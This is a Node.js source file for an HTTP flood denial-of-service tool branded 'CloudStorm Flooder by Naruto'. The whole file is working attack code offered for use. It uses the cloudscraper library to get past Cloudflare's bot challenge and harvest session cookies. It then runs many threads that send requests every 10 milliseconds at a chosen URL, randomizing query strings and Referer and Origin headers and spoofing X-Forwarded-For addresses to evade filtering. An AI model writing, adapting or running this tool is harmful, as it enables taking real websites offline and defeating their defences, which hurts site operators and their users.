const cloudscraper = require('cloudscraper');
const chalk = require('chalk');
const https = require('https');

const args = process.argv.slice(2);

const BANNER = `
${chalk.redBright('╔══════════════════════════════════════════════════════╗')}
${chalk.redBright('║')}              ${chalk.bold.yellow('CloudStorm Flooder by Naruto')}               ${chalk.redBright('║')}
${chalk.redBright('║')}             ${chalk.gray('Author:')} ${chalk.cyanBright('Naruto')} | ${chalk.gray('Open Source')}            ${chalk.redBright('║')}
${chalk.redBright('╚══════════════════════════════════════════════════════╝')}
`;

if (args.length < 2) {
  console.log(BANNER);
  console.log(chalk.cyanBright('[Usage] ') + `node naruto-flooder.js <url> <time> [threads]`);
  process.exit(1);
}

const url = args[0];
const time = Number(args[1]);
const threads = Number(args[2]) || 10;

const rStr = (l) => {
  const a = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let s = '';
  for (let i = 0; i < l; i++) s += a[Math.floor(Math.random() * a.length)];
  return s;
};

const rIp = () => {
  const r = () => Math.floor(Math.random() * 255);
  return `${r()}.${r()}.${r()}.${r()}`;
};

const httpsAgent = new https.Agent({ rejectUnauthorized: false });

console.log(BANNER);
console.log(chalk.magentaBright(`[⚡ PHASE 1] Bypassing Cloudflare...`));

cloudscraper.get({
  uri: url,
  agent: httpsAgent,
  strictSSL: false,
}).then(response => {
  
  const jar = cloudscraper.jar();

  cloudscraper.get({
    uri: url,
    jar: jar,
    agent: httpsAgent,
    strictSSL: false,
  }).then(body => {
    // Extract cookie from jar for this url
    const cookies = jar.getCookies(url);
    const cookie = cookies.map(c => `${c.key}=${c.value}`).join('; ');

    if (!cookie) {
      console.log(chalk.redBright('[❌ ERROR] Credentials missing: No cookies found.'));
      return process.exit(1);
    }


    const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
      '(KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36';

    console.log(chalk.greenBright(`[✅ SUCCESS] Credentials obtained.`));
    console.log(chalk.cyan(`  • User-Agent: ${userAgent}`));
    console.log(chalk.cyan(`  • Cookie: ${cookie.substring(0, 40)}...`));
    console.log(chalk.magentaBright(`\n[🔥 PHASE 2] Initiating attack...`));
    console.log(chalk.yellowBright(`  • Target: ${url}`));
    console.log(chalk.yellowBright(`  • Duration: ${time} seconds`));
    console.log(chalk.yellowBright(`  • Threads: ${threads}\n`));

    let requests = 0;
    let errors = 0;

    const attack = () => {
      cloudscraper.get({
        uri: url + '?' + rStr(12),
        headers: {
          'User-Agent': userAgent,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Referer': `https://google.com/${rStr(10)}`,
          'Origin': 'https://' + rStr(8) + '.com',
          'cookie': cookie,
          'X-Forwarded-For': rIp(),
        },
        agent: httpsAgent,
        strictSSL: false,
      })
      .then(() => requests++)
      .catch(() => errors++);
    };

    const intervals = [];
    for (let i = 0; i < threads; i++) {
      intervals.push(setInterval(attack, 10));
    }

    const status = setInterval(() => {
      process.stdout.write(
        chalk.blueBright(`\r[📊 STATS] Sent: ${requests} | Errors: ${errors} | Threads: ${threads} `)
      );
    }, 1000);

    setTimeout(() => {
      intervals.forEach(clearInterval);
      clearInterval(status);
      console.log(chalk.redBright('\n\n--- Attack Complete ---'));
      console.log(chalk.greenBright(`✔ Total Sent: ${requests}`));
      console.log(chalk.redBright(`✘ Total Errors: ${errors}`));
      process.exit(0);
    }, time * 1000);

  }).catch(err => {
    console.log(chalk.redBright(`[❌ ERROR] Failed to acquire credentials: ${err.message}`));
    process.exit(1);
  });

}).catch(err => {
  console.log(chalk.redBright(`[❌ ERROR] Failed to bypass Cloudflare: ${err.message}`));
  process.exit(1);
});
